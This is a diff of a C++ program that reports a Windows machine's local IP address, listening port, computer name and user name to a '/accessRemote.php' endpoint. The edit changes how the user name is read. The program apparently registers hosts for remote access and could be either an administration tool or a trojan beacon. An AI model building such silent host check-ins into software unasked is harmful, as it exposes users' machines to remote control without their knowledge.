@@ -394,12 +394,13 @@ int main(int argc, char *argv[])
 			temps = temps2;
 			str.str("");
 			str.clear();
+			GetUserNameW(username, &usernameSize);
 			str << "/accessRemote.php?ipLocal=" << sf::IpAddress::getLocalAddress() << "&";
 			str << "port=" << listener.getLocalPort() << "&";
 			_dupenv_s(&pValue1, &len1, "COMPUTERNAME");
 			str << "compName=" << pValue1 << "&";
 			_dupenv_s(&pValue2, &len2, "USERNAME");
-			str << "userName=" << pValue2 << "&";
+			str << "userName=" << username << "&";
 			str << "version=" << version;
 			request.setUri(str.str());
 			//cout << "str: " << str.str() << endl;
@@ -414,7 +415,7 @@ int main(int argc, char *argv[])
 				_dupenv_s(&pValue1, &len1, "COMPUTERNAME");
 				str << "compName=" << pValue1 << "&";
 				_dupenv_s(&pValue2, &len2, "USERNAME");
-				str << "userName=" << pValue2;
+				str << "userName=" << username;
 				request.setUri(str.str());
 
 				response = http.sendRequest(request);
@@ -443,7 +444,6 @@ int main(int argc, char *argv[])
 				_dupenv_s(&pValue1, &len1, "COMPUTERNAME");
 				str << "compName=" << pValue1 << "&";
 				_dupenv_s(&pValue2, &len2, "USERNAME");
-				GetUserNameW(username, &usernameSize);
 				str << "userName=" << username;
 				request.setUri(str.str());
 
